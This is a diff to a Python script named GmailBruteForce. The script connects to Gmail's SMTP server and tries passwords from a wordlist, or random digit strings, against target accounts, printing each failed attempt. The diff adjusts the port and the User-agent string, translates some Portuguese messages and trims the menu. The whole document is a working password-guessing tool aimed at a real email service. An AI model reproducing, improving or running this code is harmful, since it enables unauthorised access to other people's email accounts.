@@ -22,7 +22,7 @@ class GmailBruteForce():
             self.passwords.append(line)
 
     def init_smtplib(self):
-        self.smtp = smtplib.SMTP("smtp.gmail.com")
+        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
         self.smtp.starttls()
         self.smtp.ehlo()
     
@@ -37,25 +37,22 @@ class GmailBruteForce():
                     self.init_smtplib()
                     break;
                 except smtplib.SMTPAuthenticationError:
-                    # print("\033[1;31mdesculpe essa não é sua senha\033[1;m")
-                    print(("\033[1;31mdesculpe essa não é sua senha %s " % user + " -> %s \033[1;m" % password ))
+                    # print("\033[1;31msorry \033[1;m")
+                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
 
 print('''
 	                        
  __   __ __   __  o |   
 (__| |  )  ) (__( | |_, 
  __/                    
-''')
+	''')
 
 instance = GmailBruteForce()
 
 do = input('''
-		    For Favor Escolhe uma opção?
-		1 - Gmail ( Normal com sua wordlsit) 
-		2 - Gmail ( Combinação de senha)
-		3 - Veja O Tutorial de como Criar Sua Wordlsit
-		4 - deixe sua doação no paypal 
-		5 - deixe sua doação pix
+		Choose any number ?
+		1 - Gmail ( Normal com sua  wordlsit ) 
+		2-  Gmail ( combinação de senha )
                 
 		
 		==> ''')
@@ -76,9 +73,8 @@ if do == '2':
     for i in range(10):
         senha += random.choice(string.digits+' ')
     
-    headers = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36')]
+    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
     instance.accounts.append(user)
-   
-
-    instance.try_gmail()
+    #a função get_pass_list, nao serve para o ramdom, pois ela exige que abra uma wordlist
+    instance.get_no_pass_list(senha)
